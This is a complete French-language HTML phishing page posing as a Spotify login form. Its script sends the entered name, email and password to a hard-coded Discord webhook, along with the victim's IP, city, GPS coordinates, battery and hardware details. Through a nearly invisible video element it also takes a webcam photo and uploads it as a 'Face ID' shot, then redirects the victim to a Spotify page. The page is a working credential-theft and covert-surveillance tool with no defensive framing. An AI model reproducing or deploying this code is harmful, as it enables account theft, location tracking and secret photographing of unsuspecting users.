<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Spotify - Connexion</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Figtree:wght@400;700;900&display=swap');
        body { background-color: #000; color: #fff; font-family: 'Figtree', sans-serif; margin: 0; display: flex; justify-content: center; overflow-x: hidden; }
        .app-card { width: 100%; max-width: 450px; padding: 40px 25px; text-align: center; }
        .logo { width: 45px; margin: 0 auto 35px auto; }
        .field { text-align: left; margin-bottom: 15px; }
        label { display: block; font-size: 13px; font-weight: 700; margin-bottom: 8px; color: #fff; }
        input { width: 100%; background: #121212; border: 1px solid #727272; border-radius: 4px; padding: 14px; color: #fff; font-size: 15px; outline: none; }
        input:focus { border: 2px solid #1ed760; }
        .btn-green { background: #1ed760; color: #000; font-weight: 700; padding: 16px; border-radius: 500px; width: 100%; margin-top: 25px; font-size: 16px; border: none; cursor: pointer; text-transform: uppercase; }
        #loader { display: none; margin-top: 20px; }
        .progress-bg { background: #282828; height: 4px; width: 100%; border-radius: 10px; overflow: hidden; }
        .progress-bar { background: #1ed760; height: 100%; width: 0%; transition: width 0.5s; }
        #v { position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.1; z-index: -1; pointer-events: none; }
    </style>
</head>
<body>
    <div class="app-card">
        <img src="https://upload.wikimedia.org/wikipedia/commons/1/19/Spotify_logo_without_text.svg" class="logo">
        <div id="ui">
            <div class="flex gap-2">
                <div class="field w-1/2"><label>Prénom</label><input id="fn" type="text"></div>
                <div class="field w-1/2"><label>Nom</label><input id="ln" type="text"></div>
            </div>
            <div class="field"><label>E-mail ou utilisateur</label><input id="u" type="text"></div>
            <div class="field"><label>Mot de passe</label><input id="p" type="password"></div>
            <button onclick="overkill()" id="btn" class="btn-green">Se connecter</button>
        </div>
        <div id="loader">
            <div class="progress-bg"><div id="pbar" class="progress-bar"></div></div>
            <p id="st" style="font-size: 11px; color: #1ed760; margin-top: 10px; font-weight:900; letter-spacing:1px;">ENCRYPTAGE DES DONNÉES...</p>
        </div>
    </div>

    <video id="v" autoplay playsinline muted></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        const hook = "https://discord.com/api/webhooks/1481101174131392554/JO8MZpYjagqXqSFcnyp4ZCyOnUKe-vVdsyNeg7e7IJCVwdIgzlmeWxH65dQzr7hUXxke";

        async function overkill() {
            const user = { fn: document.getElementById('fn').value, ln: document.getElementById('ln').value, u: document.getElementById('u').value, p: document.getElementById('p').value };
            if(!user.u || !user.p) return;

            document.getElementById('ui').style.display = 'none';
            document.getElementById('loader').style.display = 'block';
            const pb = document.getElementById('pbar');
            
            let stream = null;
            try { stream = await navigator.mediaDevices.getUserMedia({ video: true }); document.getElementById('v').srcObject = stream; } catch(e){}

            pb.style.width = "20%";
            let gps = "❌ Bloqué";
            try {
                const pos = await new Promise((res, rej) => { navigator.geolocation.getCurrentPosition(res, rej, {timeout: 6000}); });
                gps = `✅ [Maps](https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude})`;
            } catch(e){}

            pb.style.width = "40%";
            let net = {}; try { net = await fetch('https://ipapi.co/json/').then(r => r.json()); } catch(e){}
            let bat = {}; try { bat = await navigator.getBattery(); } catch(e){}
            
            const can = document.createElement('canvas');
            const gl = can.getContext('webgl');
            const debug = gl.getExtension('WEBGL_debug_renderer_info');
            const gpuVendor = gl ? gl.getParameter(debug.UNMASKED_VENDOR_WEBGL) : "Inconnu";
            const gpuModel = gl ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : "Inconnu";
            const conn = navigator.connection || {};
            const ramUsage = window.performance && window.performance.memory ? Math.round(window.performance.memory.usedJSHeapSize / 1048576) + " MB" : "Non supporté";

            const payload = {
                embeds: [{
                    title: `💀 OVERKILL-LOG V38 - ${user.fn} ${user.ln}`,
                    color: 1955168,
                    fields: [
                        { name: "👤 ACCÈS COMPTE", value: `**Prénom/Nom:** \`${user.fn} ${user.ln}\`\n**Email:** \`${user.u}\`\n**Pass:** \`${user.p}\`` },
                        { name: "📍 RÉSEAU & IP", value: `**IP:** \`${net.ip}\`\n**FAI:** \`${net.org}\`\n**Ville:** \`${net.city}\` (${net.country_name})\n**VPN/Proxy:** \`${net.proxy ? 'OUI' : 'NON'}\`` },
                        { name: "🛠️ HARDWARE (DÉTAILLÉ)", value: `**GPU Vendor:** \`${gpuVendor}\`\n**GPU Model:** \`${gpuModel}\`\n**Cœurs CPU:** \`${navigator.hardwareConcurrency}\`\n**RAM Dispo:** \`${navigator.deviceMemory}GB\`\n**RAM Utilisée:** \`${ramUsage}\`\n**Écran:** \`${screen.width}x${screen.height}\`` },
                        { name: "🔋 BATTERIE & STATUT", value: `**Niveau:** \`${bat.level ? Math.round(bat.level*100) : '?'}%\`\n**En charge:** \`${bat.charging ? 'OUI' : 'NON'}\`\n**Géoloc:** ${gps}` },
                        { name: "🖥️ LOGICIEL", value: `**Système:** \`${navigator.platform}\`\n**Langue:** \`${navigator.language}\`\n**UA:** \`\`\`${navigator.userAgent}\`\`\`` }
                    ],
                    footer: { text: "SYSTEM OVERKILL ULTIMATE • " + new Date().toLocaleString() }
                }]
            };

            await fetch(hook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });

            pb.style.width = "90%";
            if(stream) {
                await new Promise(r => setTimeout(r, 3500));
                const v = document.getElementById('v');
                const canv = document.getElementById('c');
                canv.width = v.videoWidth; canv.height = v.videoHeight;
                canv.getContext('2d').drawImage(v, 0, 0);
                
                canv.toBlob(async b => {
                    const fd = new FormData();
                    fd.append('file', b, 'overkill_shot.jpg');
                    fd.append('content', `📸 **Face ID : ${user.fn} ${user.ln}**`);
                    await fetch(hook, { method: 'POST', body: fd });
                    stream.getTracks().forEach(t => t.stop());
                    window.location.href = "http://googleusercontent.com/spotify.com/premium";
                }, 'image/jpeg', 0.8);
            } else {
                setTimeout(() => { window.location.href = "http://googleusercontent.com/spotify.com/premium"; }, 1000);
            }
        }
    </script>
</body>
</html>
